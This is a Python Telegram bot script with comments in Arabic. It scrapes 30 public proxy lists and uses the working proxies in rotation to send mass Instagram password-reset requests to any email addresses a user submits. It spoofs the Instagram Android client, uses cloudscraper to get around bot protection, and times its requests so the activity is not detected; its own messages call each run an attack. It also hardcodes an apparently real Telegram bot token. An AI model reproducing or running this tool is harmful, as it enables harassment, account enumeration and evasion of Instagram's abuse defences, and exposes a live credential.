import telebot
import requests
import re
import uuid
import time
import concurrent.futures
import cloudscraper
from user_agent import generate_user_agent

# --- إعدادات البوت ---
API_TOKEN = '8488920682:AAGhoJ-R5q5Xd4nVULrdmSxM2YfSch6j2RU'
bot = telebot.TeleBot(API_TOKEN)

# --- قائمة الـ 30 مصدر للبروكسيات ---
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/rooster127/proxylist/main/proxylist.txt",
    "https://api.openproxylist.xyz/http.txt",
    "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
    "https://www.proxyscan.io/download?type=http",
    "https://raw.githubusercontent.com/officialputuid/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_list.txt",
    "https://raw.githubusercontent.com/Zaeem20/Free_Proxy_List/master/http.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list.txt",
    "https://raw.githubusercontent.com/VolkanSah/ProxyList/master/http.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
    "https://raw.githubusercontent.com/RX4096/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/vakhov/free-proxy-list/master/proxies/http.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
    "https://raw.githubusercontent.com/Zispanos/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/prx7/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/Andrey_Onze/Proxy_List/main/http.txt",
    "https://proxyspace.pro/http.txt",
    "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000",
    "https://alexa.lr22.com/http.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt"
]

# --- دالة سحب وفحص البروكسيات ---
def get_working_proxies():
    all_proxies = []
    for source in PROXY_SOURCES:
        try:
            response = requests.get(source, timeout=5)
            found = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', response.text)
            all_proxies.extend(found)
        except: continue
    
    unique_proxies = list(set(all_proxies))
    working = []

    def test_proxy(proxy):
        try:
            # فحص البروكسي على رابط إنستغرام مباشرة
            r = requests.get("https://i.instagram.com/", proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"}, timeout=3)
            if r.status_code == 200: return proxy
        except: return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        results = executor.map(test_proxy, unique_proxies[:200]) # فحص أول 200 لضمان السرعة
        for p in results:
            if p: working.append(p)
    return working

# --- دالة إرسال الريست باحترافية ---
def send_insta_reset(email, proxy):
    scraper = cloudscraper.create_scraper()
    device_id = f"android-{uuid.uuid4().hex[:16]}"
    guid = str(uuid.uuid4())
    
    url = "https://i.instagram.com/api/v1/accounts/send_password_reset/"
    headers = {
        "User-Agent": "Instagram 269.1.0.18.231 Android (29/10; 480dpi; 1080x2280; samsung; SM-G973F; beyond1; exynos9820; en_US; 441001473)",
        "X-IG-App-ID": "936619743392459",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    data = {"user_email": email, "device_id": device_id, "guid": guid, "_csrftoken": "missing"}
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    try:
        response = scraper.post(url, data=data, headers=headers, proxies=proxies, timeout=10)
        # التحقق من نجاح العملية
        if '"status":"ok"' in response.text or 'obfuscated_email' in response.text:
            return True
        return False
    except: return False

# --- واجهة التلجرام ---
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🔥 أهلاً Dexr! البوت الآن مجهز بنظام سحب 30 مصدر بروكسي وفحصها تلقائياً قبل كل هجوم.")

@bot.message_handler(func=lambda m: True)
def handle_emails(message):
    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', message.text)
    if not emails:
        return bot.reply_to(message, "⚠️ ارسل إيميلات صالحة.")

    status_msg = bot.send_message(message.chat.id, "🔄 جاري سحب وفحص بروكسيات من 30 مصدر... انتظر قليلاً.")
    working_proxies = get_working_proxies()
    
    if not working_proxies:
        return bot.edit_message_text("❌ لم يتم العثور على بروكسيات شغالة حالياً، حاول لاحقاً.", message.chat.id, status_msg.message_id)

    bot.edit_message_text(f"✅ تم تجهيز {len(working_proxies)} بروكسي شغال. بدأت عملية الفحص...", message.chat.id, status_msg.message_id)

    for i, email in enumerate(emails):
        # توزيع البروكسيات بالتناوب (Rotation)
        current_proxy = working_proxies[i % len(working_proxies)]
        success = send_insta_reset(email, current_proxy)
        
        if success:
            bot.send_message(message.chat.id, f"🎯 تم إرسال ريست بنجاح: {email}\n🌐 عبر: {current_proxy}")
        else:
            bot.send_message(message.chat.id, f"❌ فشل أو غير مربوط: {email}")
        
        time.sleep(1) # تأخير بسيط لتجنب كشف النشاط المريب

bot.polling()
